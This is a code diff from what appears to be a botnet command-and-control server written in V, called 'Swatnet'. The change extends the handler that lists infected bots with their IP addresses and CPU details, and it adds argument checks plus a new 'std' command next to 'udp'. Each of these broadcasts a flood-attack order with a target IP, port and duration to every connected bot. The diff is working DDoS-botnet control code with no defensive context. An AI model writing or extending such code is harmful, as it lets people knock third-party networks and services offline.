@@ -90,12 +90,25 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 				"bots" {
 					client.write_string("Bots: ${s.bot.nickname.len}\r\n#######################################\r\n") or { 0 }
 					for i in 0..(s.bot.ip).len {
-						client.write_string("BID: ${i} | IP: ${s.bot.ip[i]}\r\n") or { 0 }
+						client.write_string("BID: ${i} | Nickname: ${s.bot.nickname[i]} | IP: ${s.bot.ip[i]} | CPU: ${s.bot.cpu[i]}\r\n") or { 0 }
 					}
 				}
 				"udp" {
-					s.bot.broadcast_cmd("udp ${args[1]} ${args[2]} ${args[3]}")
-				} else {}
+					if args.len < 4 {
+						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: udp <ip> <port> <time>\r\n") or { 0 }
+					} else {
+						s.bot.broadcast_cmd("udp ${args[1]} ${args[2]} ${args[3]}")
+					}
+				} 
+				"std" {
+					if args.len < 4 {
+						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: udp <ip> <port> <time>\r\n") or { 0 }
+					} else {
+						s.bot.broadcast_cmd("std ${args[1]} ${args[2]} ${args[3]}")
+					}
+				} else { 
+					client.write_string("[ x ] Error, No command found....!\r\n") or { 0 }
+				}
 			}
 			println(data)
 		}
